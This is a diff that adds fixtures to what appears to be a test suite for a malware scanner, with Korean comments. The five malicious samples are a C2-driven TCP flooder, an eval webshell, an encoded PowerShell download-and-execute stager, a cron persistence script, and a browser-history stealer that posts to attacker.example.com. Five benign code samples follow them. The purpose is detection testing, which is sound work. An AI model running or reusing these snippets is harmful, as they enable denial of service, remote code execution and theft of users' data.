@@ -1400,6 +1400,227 @@ class Controller:
         return rows[0] if rows else None
 '''},
     ),
+    # ─── 사이클 9: 악성 5 (botnet/webshell/post-exploit) ─────
+    _mal(
+        "mirai-style-tcp-flooder",
+        description="Mirai 류 — 외부 C2 명령 받아 TCP flood",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="botnet flooder",
+        files={"flood.py": '''
+import socket, threading, requests
+def flood(target, port, duration):
+    end = __import__("time").time() + duration
+    while __import__("time").time() < end:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target, port))
+            s.send(b"GET / HTTP/1.1\\r\\nHost: x\\r\\n\\r\\n" * 100)
+            s.close()
+        except Exception:
+            pass
+
+# C2 명령 받기
+while True:
+    try:
+        cmd = requests.get("https://attacker.example.com/c2/cmd").json()
+        if cmd.get("action") == "flood":
+            threading.Thread(
+                target=flood,
+                args=(cmd["target"], cmd["port"], cmd.get("dur", 60)),
+                daemon=True,
+            ).start()
+    except Exception:
+        pass
+    __import__("time").sleep(30)
+'''},
+    ),
+    _mal(
+        "webshell-eval-handler",
+        description="HTTP request 받아 eval 실행 (WebShell)",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="WebShell — POST cmd → eval",
+        files={"shell.py": '''
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+class Handler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        length = int(self.headers.get("Content-Length", "0"))
+        body = self.rfile.read(length).decode()
+        try:
+            result = eval(body)  # remote arbitrary expression
+        except Exception as e:
+            result = str(e)
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(str(result).encode())
+
+HTTPServer(("0.0.0.0", 8888), Handler).serve_forever()
+'''},
+    ),
+    _mal(
+        "powershell-empire-stager",
+        description="PowerShell Empire stager — Win32 + base64 + IEX",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="Windows post-exploit",
+        files={"stager.py": '''
+import subprocess, base64
+# Empire-style stager — 인코딩된 PS 페이로드를 IEX 로 실행
+encoded = "JAB3ID0gTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50OyAkdy5Eb3duXG9hZFN0cmluZygnaHR0cDovL2V2aWwnKSB8IElFWA=="
+ps_cmd = (
+    f"powershell.exe -ExecutionPolicy Bypass -NoProfile "
+    f"-EncodedCommand {encoded}"
+)
+subprocess.Popen(ps_cmd, shell=True)
+'''},
+    ),
+    _mal(
+        "linux-cron-persistence",
+        description="crontab 추가로 영속성 확보",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="SYS-002 cron persistence",
+        files={"persist.py": '''
+import subprocess
+# 매 분마다 페이로드 실행
+cron_line = "* * * * * /tmp/.payload.sh > /dev/null 2>&1\\n"
+existing = subprocess.run(
+    ["crontab", "-l"], capture_output=True, text=True
+).stdout
+new = existing + cron_line
+subprocess.run(["crontab", "-"], input=new, text=True)
+'''},
+    ),
+    _mal(
+        "browser-history-exfil",
+        description="Firefox/Chrome history SQLite 직접 추출",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="creds-paths 변형",
+        files={"history.py": '''
+import os, sqlite3, requests
+candidates = [
+    os.path.expanduser("~/.mozilla/firefox/*/places.sqlite"),
+    os.path.expanduser("~/.config/google-chrome/Default/History"),
+    os.path.expanduser("~/Library/Application Support/Firefox/Profiles/*/places.sqlite"),
+]
+import glob
+for pat in candidates:
+    for path in glob.glob(pat):
+        try:
+            con = sqlite3.connect(path)
+            rows = con.execute(
+                "SELECT url, title FROM moz_places LIMIT 5000"
+            ).fetchall() if "places" in path else con.execute(
+                "SELECT url, title FROM urls LIMIT 5000"
+            ).fetchall()
+            con.close()
+            requests.post(
+                "https://attacker.example.com/history",
+                json={"path": path, "rows": [list(r) for r in rows]},
+            )
+        except Exception:
+            pass
+'''},
+    ),
+    # ─── 사이클 9: 정상 5 (블록체인 / 게임 / IoT) ──────────
+    _ben(
+        "web3-eth-balance",
+        description="web3.py 잔고 조회 (정상)",
+        files={"eth.py": '''
+"""Read-only Ethereum balance query."""
+from web3 import Web3
+
+def get_balance(rpc_url: str, address: str) -> int:
+    w3 = Web3(Web3.HTTPProvider(rpc_url))
+    return w3.eth.get_balance(Web3.to_checksum_address(address))
+
+def get_block(rpc_url: str, block_num: int):
+    w3 = Web3(Web3.HTTPProvider(rpc_url))
+    return w3.eth.get_block(block_num)
+'''},
+    ),
+    _ben(
+        "pygame-loop",
+        description="pygame 게임 루프 (정상 — 무한 루프 + draw)",
+        files={"game.py": '''
+"""Standard pygame main loop."""
+import pygame
+
+def main():
+    pygame.init()
+    screen = pygame.display.set_mode((640, 480))
+    clock = pygame.time.Clock()
+    running = True
+    while running:
+        for event in pygame.event.get():
+            if event.type == pygame.QUIT:
+                running = False
+        screen.fill((30, 30, 30))
+        pygame.draw.circle(screen, (200, 200, 50), (320, 240), 50)
+        pygame.display.flip()
+        clock.tick(60)
+    pygame.quit()
+'''},
+    ),
+    _ben(
+        "mqtt-iot-publisher",
+        description="MQTT 메시지 발행 (IoT 정상)",
+        files={"mqtt_pub.py": '''
+"""IoT MQTT publisher."""
+import paho.mqtt.client as mqtt
+
+class TelemetryPublisher:
+    def __init__(self, broker: str, port: int = 1883):
+        self.client = mqtt.Client()
+        self.client.connect(broker, port)
+
+    def publish(self, topic: str, payload: dict):
+        import json
+        self.client.publish(topic, json.dumps(payload), qos=1)
+
+    def loop(self):
+        self.client.loop_forever()
+'''},
+    ),
+    _ben(
+        "openpyxl-spreadsheet",
+        description="Excel 파일 읽기/쓰기",
+        files={"xlsx.py": '''
+"""openpyxl wrappers."""
+from openpyxl import load_workbook, Workbook
+
+def read_sheet(path: str, sheet: str = None):
+    wb = load_workbook(path, read_only=True)
+    ws = wb[sheet] if sheet else wb.active
+    return [list(row) for row in ws.iter_rows(values_only=True)]
+
+def write_sheet(path: str, rows: list, sheet_name: str = "Sheet1"):
+    wb = Workbook()
+    ws = wb.active
+    ws.title = sheet_name
+    for row in rows:
+        ws.append(row)
+    wb.save(path)
+'''},
+    ),
+    _ben(
+        "asyncio-websocket-server",
+        description="websockets 라이브러리 서버 (정상 listen)",
+        files={"ws.py": '''
+"""asyncio websockets server."""
+import asyncio
+import websockets
+
+async def echo(websocket):
+    async for message in websocket:
+        await websocket.send(f"echo: {message}")
+
+async def main():
+    async with websockets.serve(echo, "127.0.0.1", 8765):
+        await asyncio.Future()
+
+if __name__ == "__main__":
+    asyncio.run(main())
+'''},
+    ),
     # ─── 정상 fixture 추가 10 ───────────────────────────────
     _ben(
         "fastapi-style-app",
